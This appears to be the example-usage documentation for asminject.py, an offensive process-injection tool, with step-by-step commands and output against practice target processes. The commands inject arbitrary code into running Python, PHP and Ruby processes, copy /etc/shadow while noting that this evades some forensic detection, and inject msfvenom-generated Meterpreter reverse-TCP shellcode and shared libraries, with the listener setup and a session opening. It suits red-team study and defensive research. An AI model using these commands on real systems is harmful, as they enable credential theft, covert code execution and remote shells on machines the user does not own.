# asminject.py examples - x86-64 payloads
* [Create a world-readable copy of a file using only Linux syscalls](#create-a-world-readable-copy-of-a-file-using-only-linux-syscalls)
* [Execute arbitrary Python code inside an existing Python 3 process](#execute-arbitrary-python-code-inside-an-existing-python-3-process)
* [Execute arbitrary Python code inside an existing Python 2 process](#execute-arbitrary-python-code-inside-an-existing-python-2-process)
* [Execute arbitrary PHP code inside an existing PHP process](#execute-arbitrary-php-code-inside-an-existing-php-process)
* [Execute arbitrary Ruby code inside an existing Ruby process](#execute-arbitrary-ruby-code-inside-an-existing-ruby-process)
* [Inject Meterpreter into an existing process](#inject-meterpreter-into-an-existing-process)
* [Inject shellcode into a separate thread of an existing process](#inject-shellcode-into-a-separate-thread-of-an-existing-process)
* [Inject a Linux shared library (.so) file into an existing process, like the original dlinject.py](#inject-a-linux-shared-library-so-file-into-an-existing-process-like-the-original-dlinjectpy)
* [Inject a Linux shared library (.so) file into a new thread in an existing process](#inject-a-linux-shared-library-so-file-into-a-new-thread-in-an-existing-process)
* [Create a copy of a file using buffered read/write libc calls](#create-a-copy-of-a-file-using-buffered-readwrite-libc-calls)

## Create a world-readable copy of a file using only Linux syscalls

This code requires no relative offset information, because it's all done using Linux syscalls. It may also help avoid some methods of forensic detection versus using the `cp`, `cat`, or other shell commands.

In one terminal window, launch one of the practice targets, e.g.:

```
$ python3 practice/python_loop.py

2022-05-12T19:41:23.109251 - Loop count 0
2022-05-12T19:41:28.115898 - Loop count 1
2022-05-12T19:41:33.119542 - Loop count 2
```

In a second terminal window, find the process ID of the target and run `asminject.py` (as `root`) against it.

This payload requires two variables: `sourcefile` and `destfile`.

```
# ps auxww | grep python3 | grep -v grep

root     2036577  [...] python3 practice/python_loop.py

# python3 ./asminject.py 2036577 copy_file_using_syscalls.s \
   --var sourcefile "/etc/shadow" \
   --var destfile "/tmp/bishopfox.txt"

...omitted for brevity...

# cat /tmp/shadow_copied_using_syscalls.txt

root:!:18704:0:99999:7:::
daemon:*:18704:0:99999:7:::
bin:*:18704:0:99999:7:::
sys:*:18704:0:99999:7:::
...omitted for brevity...
```

## Execute arbitrary Python code inside an existing Python 3 process

Launch a harmless Python process that simulates one with access to super-secret, sensitive data.

```
$ sudo python3 practice/python_loop.py

2022-05-12T19:46:46.245462 - Loop count 0
2022-05-12T19:46:51.253640 - Loop count 1
2022-05-12T19:46:56.264897 - Loop count 2
```

In a separate terminal, locate the process and inject some arbitrary Python code into it. Note the use of the `--non-pic-binary` option discussed in <a href="docs/specialized_options.md#specifying-non-pic-code">specialized options</a>, as this is required for Python 3.9 specifically. For other Python versions, you may or may not need to exclude the option.

This payload requires one variable: `pythoncode`, which should contain the Python script code to execute in the existing Python process.

```
# python3 ./asminject.py 2037475 execute_python_code.s \
   --relative-offsets-from-binaries \
   --non-pic-binary "/usr/bin/python3\\.[0-9]+" \
   --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
   
...omitted for brevity...
```

Verify that the file has been copied:

```
# cat /tmp/bishopfox.txt 

root:!:18704:0:99999:7:::
daemon:*:18704:0:99999:7:::
bin:*:18704:0:99999:7:::
sys:*:18704:0:99999:7:::
```

## Execute arbitrary Python code inside an existing Python 2 process

If you're targeting a legacy Python 2 process instead of Python 3, you'll most likely need to omit the `--non-pic-binary` option, e.g. same as the previous example, except:

```
# python3 ./asminject.py 2144294 execute_python_code.s --relative-offsets-from-binaries \
   --stop-method "slow" \
   --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
```

## Execute arbitrary PHP code inside an existing PHP process

PHP has a similar "compile and execute this sequence of source code" method.

This payload requires two variables: `phpcode`, which should contain the PHP code that should be executed in the existing PHP process, and `phpname`, which can generally be set to any string.

This payload requires relative offsets for the `php` binary used by the target process.

In one terminal window, launch the practice PHP loop, e.g.:

```
$ php practice/php_loop.php

2022-05-12T13:40:51-0700 - Loop count 0
2022-05-12T13:40:56-0700 - Loop count 1
2022-05-12T13:41:01-0700 - Loop count 2
```

In a separate window, find the target process, and inject the code:

```
# ps auxww | grep php | grep -v grep  
  
root     2037629  [...] php practice/php_loop.php

# python3 ./asminject.py 2037629 execute_php_code.s \
   --relative-offsets-from-binaries --stop-method "slow" \
   --var phpcode "echo \\\"Injected PHP code\\\n\\\";" \
   --var phpname PHP
```

In the first window, note that the loop is interrupted by the injected code, e.g.:

```
2022-05-12T13:41:46-0700 - Loop count 11
Injected PHP code
2022-05-12T13:41:53-0700 - Loop count 12
2022-05-12T13:41:58-0700 - Loop count 13
```

## Execute arbitrary Ruby code inside an existing Ruby process

Ruby has a similar "compile and execute this sequence of Ruby source code" method. The current code for it in `asminject.py` has a few limitations, but it does work:

* No ability to require additional Ruby gems
* The targeted process will lock up after the injected code finishes executing

This payload requires one variable: `rubycode`, which should contain the Ruby code you want to execute in the existing Ruby process.

This payload requires relative offsets for the `libruby` shared library used by the target process.

In one terminal window, launch the practice Ruby loop, e.g.:

```
$ ruby practice/ruby_loop.rb

2022-05-12T13:40:51-0700 - Loop count 0
2022-05-12T13:40:56-0700 - Loop count 1
2022-05-12T13:41:01-0700 - Loop count 2
```

In a separate window, find the target process, and inject the code:

```
# ps auxww | grep ruby | grep -v grep

root     2037714  [...] ruby practice/ruby_loop.rb

# python3 ./asminject.py 2037714 execute_ruby_code.s \
   --relative-offsets-from-binaries --stop-method "slow" \
   --var rubycode "puts(\\\"Injected Ruby code\\\")"
```

In the first window, note that the loop is interrupted by the injected code, but fails to continue executing the original loop even though the process remains running:

```
2022-05-12T13:44:41-07:00 - Loop count 7
2022-05-12T13:44:46-07:00 - Loop count 8
Injected Ruby code
```

## Inject Meterpreter into an existing process

Launch a harmless process that simulates one with access to super-secret, sensitive data:

```
$ sudo python3 practice/python_loop.py

2022-05-12T20:11:30.614271 - Loop count 0
2022-05-12T20:11:35.616574 - Loop count 1
2022-05-12T20:11:40.620506 - Loop count 2
```

In a separate terminal, generate a Meterpreter payload, then launch a listener:

```
# msfvenom -p linux/x64/meterpreter/reverse_tcp -f raw \
   -o lmrt11443 LHOST=127.0.0.1 LPORT=11443

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Saved as: lmrt11443

# msfconsole

...omitted for brevity...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 11443
LPORT => 11443
msf6 exploit(multi/handler) > exploit


[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:11443 
```

In a third terminal, locate the process and inject the Meterpreter payload into it. Note the use of the `--precompiled` option to specify the `lmrt11443` shellcode.

```
# ps auxww | grep python3

root     2144475  [...] sudo python3 practice/python_loop.py
root     2144476  [...] python3 practice/python_loop.py

# python3 ./asminject.py 2144476 execute_precompiled.s \
   --stop-method "slow" --precompiled lmrt11443

...omitted for brevity...
```

You should see the following pop up in the third terminal:

```
[*] Sending stage (3008420 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:11443 -> 127.0.0.1:53682) at 2021-06-07 14:44:14 -0700

meterpreter > sysinfo
Computer     : 192.168.218.135
OS           : Debian  (Linux 5.10.0-kali3-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```

Warnings:

* You will need to ctrl-C out of `asminject.py` once injection is successful.
* The code for the original process will not continue executing after the shellcode is launched. See the threaded version below if you need that.
* The original process will exit when Meterpreter exits.

## Inject shellcode into a separate thread of an existing process

The `execute_precompiled_threaded.s` payload is identical to the `execute_precompiled.s` payload described above, except it executes the precompiled binary shellcode in a separate thread. This allows the target process to continue executing normally.

This payload requires relative offsets for `libpthread` shared library used by the target process.

```
# python3 ./asminject.py 1955172 execute_precompiled_threaded.s \
   --relative-offsets-from-binaries --stop-method "slow" \
   --precompiled lmrt11443
```

Warnings:

* The original process will still exit if your shellcode triggers an OS-level process exit. Meterpreter's default configuration does this, and as of this writing, the Linux version of Meterpreter does not have an equivalent of the Windows Meterpreter `EXITFUNC=thread` option, so the only workaround is to not call `exit` in Meterpreter until you want the target process to exit.

## Inject a Linux shared library (.so) file into an existing process, like the original dlinject.py

The `dlinject.s` payload mimics the original `dlinject.py`, except that it does so using the `dlopen` function exported by `libdl` instead of the secret `_dl_open` function that some versions of the `ld` library exported. This works around [dlinject.py's inability to run on more recent Linux versions](https://github.com/DavidBuchanan314/dlinject/issues/8).

This payload requires one variable: `librarypath`, which should point to the library you want to inject.

This payload requires relative offsets for the `libdl` shared library used by the target process.

```
# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf-so \
   -o /home/user/lmrt11443.so LHOST=127.0.0.1 LPORT=11443

# python3 ./asminject.py 1957286 dlinject.s \
   --relative-offsets-from-binaries --stop-method "slow" \
   --var librarypath "/home/user/lmrt11443.so"
```

The injection comes with the same warnings as for `execute_precompiled.s`, above.

## Inject a Linux shared library (.so) file into a new thread in an existing process

The `dlinject_threaded.s` payload is identical to `dlinject.s`, except that it launches the shellcode in a new thread, so that the original process continues performing its normal behaviour.

This payload requires one variable: `librarypath`, which should point to the library you want to inject.

This payload requires relative offsets for the `libdl` and `libpthread` shared libraries used by the target process.

```
# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf-so \
   -o /home/user/lmrt11443.so LHOST=127.0.0.1 LPORT=11443

# python3 ./asminject.py 1957286 dlinject_threaded.s \
   --relative-offsets-from-binaries --stop-method "slow" \
   --var librarypath "/home/user/lmrt11443.so"
```

This injection comes with the same warnings as for `execute_precompiled_threaded.s`, above.

## Create a copy of a file using buffered read/write libc calls

If you don't mind making library calls, writing custom code is much easier than when using the syscall-only approach. This example uses code that (like the copy-using-syscalls example) creates a copy of a file, but by using libc's `fopen()`, `fread()`, `fwrite()`, and `fclose()` instead of syscalls, can easily use a buffered approach that's more efficient.

This payload requires relative offsets for the `libc` shared library used by the target process.

```
# python3 ./asminject.py 1876570 copy_file_using_libc.s \
   --relative-offsets-from-binaries --stop-method "slow" \
   --var sourcefile "/etc/passwd" --var destfile "/var/tmp/copy_test.txt"
```
